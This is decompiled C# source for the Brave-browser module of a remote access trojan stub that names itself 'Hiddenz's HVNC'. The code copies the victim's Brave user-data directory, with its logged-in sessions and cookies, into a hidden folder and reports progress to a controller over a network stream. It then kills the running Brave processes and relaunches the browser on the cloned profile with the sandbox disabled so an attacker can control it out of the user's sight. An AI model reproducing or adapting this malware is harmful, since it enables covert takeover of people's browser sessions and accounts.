using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000054 RID: 84
	public class GClass6
	{
		// Token: 0x06000117 RID: 279
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr intptr_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

		// Token: 0x06000118 RID: 280 RVA: 0x00006FB8 File Offset: 0x000051B8
		public static void smethod_0(bool bool_0, bool bool_1, bool bool_2, string String_0)
		{
			try
			{
				if (Conversions.ToBoolean(GClass0.smethod_3(new FileInfo(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\\lockfile"))))
				{
					GClass0.smethod_2(GClass0.networkStream_0, "25|Brave has already been opened!");
				}
				else
				{
					if (bool_0)
					{
						GClass0.smethod_2(GClass0.networkStream_0, "22|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
						GClass2 gclass = new GClass2();
						gclass.method_0(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\\");
						try
						{
							GClass0.computer_0.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data", Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\\", true);
						}
						catch (Exception ex)
						{
						}
						gclass.method_2();
						GClass0.smethod_2(GClass0.networkStream_0, "206|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
					}
					else
					{
						GClass0.smethod_2(GClass0.networkStream_0, "207|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
					}
					Process[] processesByName = Process.GetProcessesByName("brave");
					for (int i = 0; i < processesByName.Length; i++)
					{
						GClass0.smethod_4(processesByName[i]);
					}
					if (bool_2)
					{
						if (bool_1)
						{
							Process.Start("brave", string.Concat(new string[]
							{
								"--user-data-dir=\"",
								Interaction.Environ("localappdata"),
								"\\BraveSoftware\\Brave-Browser\\Waluigi\" \"",
								String_0,
								"\" --allow-no-sandbox-job --no-sandbox --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio"
							})).WaitForInputIdle();
						}
						else
						{
							Process.Start("brave", string.Concat(new string[]
							{
								"--user-data-dir=\"",
								Interaction.Environ("localappdata"),
								"\\BraveSoftware\\Brave-Browser\\Waluigi\" \"",
								String_0,
								"\" --allow-no-sandbox-job --no-sandbox --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-3d-apis --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio"
							})).WaitForInputIdle();
						}
					}
					else if (bool_1)
					{
						Process.Start("brave", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\" \"data:text/html,<center><title>Welcome to Hiddenz's HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='black'>Welcome to Hiddenz's HVNC !</font></h1></center>\" --allow-no-sandbox-job --no-sandbox --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					}
					else
					{
						Process.Start("brave", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\" \"data:text/html,<center><title>Welcome to Hiddenz's HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='black'>Welcome to Hiddenz's HVNC !</font></h1></center>\" --allow-no-sandbox-job --no-sandbox --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-3d-apis --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					}
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (GClass0.smethod_1("Welcome to Hiddenz's HVNC !") == (IntPtr)0)
					{
						Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
						GClass6.SetWindowPos(GClass0.smethod_1("Welcome to Hiddenz's HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
						Application.DoEvents();
						if (stopwatch.ElapsedMilliseconds >= 10000L)
						{
							return;
						}
					}
					stopwatch.Stop();
					processesByName = Process.GetProcessesByName("brave");
					for (int j = 0; j < processesByName.Length; j++)
					{
						GClass0.smethod_5(processesByName[j]);
					}
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show(ex2.Message);
			}
		}

		// Token: 0x040000D4 RID: 212
		public const short short_0 = 2;

		// Token: 0x040000D5 RID: 213
		public const short short_1 = 1;

		// Token: 0x040000D6 RID: 214
		public const short short_2 = 4;

		// Token: 0x040000D7 RID: 215
		public const int int_0 = 64;
	}
}
